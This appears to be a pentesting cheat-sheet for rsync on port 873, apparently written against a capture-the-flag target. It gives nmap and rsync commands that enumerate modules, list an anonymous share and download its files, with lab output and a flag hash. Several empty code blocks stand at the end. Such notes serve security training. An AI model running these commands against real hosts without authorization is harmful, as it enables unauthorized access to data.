# 873 - Pentesting Rsync

[Enumerate shared folders](#enumerate-shared-folders)
[list the files instead of copying them](#rsync--av---list-only-rsyncip)
[Copy all files to your local machine](#rsync--av-rsyncippublic-download)

----------------------------------------------------

# 

### Enumerate shared folders
```
nmap -sV --script "rsync-list-modules" -p 873 $ip
```

### rsync -av --list-only rsync://$ip
--list-only              list the files instead of copying them
```
$ rsync -av --list-only rsync://$ip
public          Anonymous Share
```

### List all files
```
$ rsync -av --list-only rsync://$ip/public
receiving incremental file list
drwxr-xr-x          4,096 2022/10/25 06:02:23 .
-rw-r--r--             33 2022/10/25 05:32:03 flag.txt

sent 24 bytes  received 74 bytes  9.33 bytes/sec
total size is 33  speedup is 0.34

$ rsync -av rsync://$ip/public           
receiving incremental file list
drwxr-xr-x          4,096 2022/10/25 06:02:23 .
-rw-r--r--             33 2022/10/25 05:32:03 flag.txt

sent 24 bytes  received 74 bytes  11.53 bytes/sec
total size is 33  speedup is 0.34
```

### Copy all files to your local machine
### rsync -av rsync://$ip/public downloadInThisNewCreatedFolder
```
$ rsync -av rsync://$ip/public downloadInThisNewCreatedFolder
receiving incremental file list
created directory downloadInThisNewCreatedFolder
./
flag.txt

sent 50 bytes  received 161 bytes  24.82 bytes/sec
total size is 33  speedup is 0.16

$ cd downloadInThisNewCreatedFolder

$ ls -lh
total 4.0K
-rw-r--r-- 1 kali kali 33 Oct 25  2022 flag.txt

$ cat flag.txt                              
72eaf5344ebb84908ae543a719830519
```

### 
```

```

### 
```

```

### 
```

```